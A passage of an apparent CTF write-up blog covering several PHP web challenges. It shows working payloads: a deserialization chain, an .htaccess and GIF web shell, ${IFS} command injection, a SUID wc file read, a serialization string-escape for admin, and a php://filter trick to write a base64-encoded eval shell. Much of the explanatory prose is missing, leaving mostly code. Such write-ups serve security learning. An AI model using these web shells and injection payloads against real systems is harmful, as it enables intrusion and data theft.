<span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><p><strong>O7it1qaAgBbfAL9OVPyO</strong></p><p><code>day1,day2</code><a href="https://www.php.net/manual/zh/function.array-walk.php"></a><code>day1</code><code>day2</code></p><p></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span> = <span class="string">&quot;O7it1qaAgBbfAL9OVPyO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1 = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2 = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10 = <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="comment"># $a-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;DirectoryIterator = &quot;glob:///*&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;<span class="built_in">SplFileObject</span> = <span class="string">&quot;/flag44545615441084&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="upupup"><a class="markdownIt-Anchor" href="#upupup"></a> UPUPUP</h2><p><code>gif</code><code>GIF89a</code></p><p><strong>Apache</strong><code>.htaccess</code><strong>PHP</strong></p><p><strong></strong><a href="https://www.anquanke.com/post/id/241147#h2-19"></a></p><p><code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define width 1337</span></span><br><span class="line"><span class="comment">#define height 1337</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.gif&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><code>shell.gif</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/images/shell.gif?1=system(&quot;cat /flag&quot;);</code></p><h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;log_level&#x27;</span> =&gt; <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_input_length&#x27;</span> =&gt; <span class="number">100</span>,</span><br><span class="line">            <span class="string">&#x27;min_password_length&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">            <span class="string">&#x27;allowed_actions&#x27;</span> =&gt; [<span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;config[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logLevel</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logLevel</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logLevel = <span class="variable">$logLevel</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$level</span> = <span class="string">&#x27;info&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> === <span class="variable language_">$this</span>-&gt;logLevel) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[LOG] <span class="subst">$message</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Username must be at least 5 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Password must be at least 8 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>] = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_BCRYPT);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>]) &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;users[<span class="variable">$username</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Authentication failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$x</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="title function_ invoke__">ceil</span>(<span class="variable">$length</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>)))), <span class="number">1</span>, <span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputValidator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$maxLength</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$maxLength</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maxLength = <span class="variable">$maxLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable language_">$this</span>-&gt;maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Input exceeds maximum length of <span class="subst">&#123;$this-&gt;maxLength&#125;</span> characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$executor</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;executor = <span class="keyword">new</span> <span class="title class_">CommandExecutor</span>(<span class="variable">$logger</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;allowed_actions&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid action&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;debug&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Debug mode enabled&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;generate&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Random string: &quot;</span> . <span class="title class_">StringUtils</span>::<span class="title function_ invoke__">generateRandomString</span>(<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unknown action&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$actionHandler</span> = <span class="keyword">new</span> <span class="title class_">ActionHandler</span>(<span class="variable">$config</span>, <span class="variable">$logger</span>);</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;input&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$actionHandler</span>-&gt;<span class="title function_ invoke__">handle</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line">    <span class="variable">$userManager</span> = <span class="keyword">new</span> <span class="title class_">UserManager</span>(<span class="variable">$logger</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">addUser</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">authenticate</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$logger</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;No action provided, running default logic&quot;</span>);</span><br><span class="line">&#125; [LOG] No action provided, running <span class="keyword">default</span> logic</span><br></pre></td></tr></table></figure><p><strong></strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>input</code><code>/?action=run&amp;input=ls$&#123;IFS&#125;/</code></p><p><code>cat$&#123;IFS&#125;/flag</code><code>[LOG] Result: cat$&#123;IFS&#125;/flag</code></p><p><strong>SUID</strong><strong></strong><code>echo$&#123;IFS&#125;'&lt;?=eval($_POST[1]);?&gt;'$&#123;IFS&#125;&gt;shell.php</code><strong></strong><code>base64</code></p><p><strong></strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/wc</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure><p><strong>wc</strong><a href="https://gtfobins.github.io/gtfobins/wc/#file-read">wc</a></p><p><code>./wc --files0-from &quot;/flag&quot;</code></p><h2 id="escape"><a class="markdownIt-Anchor" href="#escape"></a> Escape!</h2><p></p><p><code>waf.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;||&quot;</span>,<span class="string">&quot;&amp;&amp;&quot;</span>,<span class="string">&quot;select&quot;</span>,<span class="string">&quot;union&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$lists</span> <span class="keyword">as</span> <span class="variable">$list</span>)&#123;</span><br><span class="line">        <span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$list</span>,<span class="string">&quot;error&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#echo $c;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>waf</code><strong></strong><code>isadmin=1</code><code>admin</code><strong></strong><code>isadmin=1</code></p><p><code>User</code><strong></strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line">adminisadmin=<span class="number">1</span> <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;21flag21</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>User<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:105:&quot;</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:1;&#125;&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isadmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">error <span class="string">&quot;;s:7:&quot;</span>isadmin<span class="string">&quot;;b:0;&#125;</span></span><br></pre></td></tr></table></figure><p><code>flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;</code></p><p><code>dashboard.php</code><a href="https://xiaolong22333.top/archives/114/">php</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//  Cookie</span></span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">checkSignedCookie</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userData</span>) &#123;</span><br><span class="line">    <span class="comment">#echo $userData;</span></span><br><span class="line">    <span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="comment">#var_dump($user);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;isadmin)&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tmp/admin.html&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>]||<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&lt;h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>filename=php://filter//convert.base64-decode/resource=/var/www/html/shell.php</code><br /><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code><code>&lt;?php exit(); 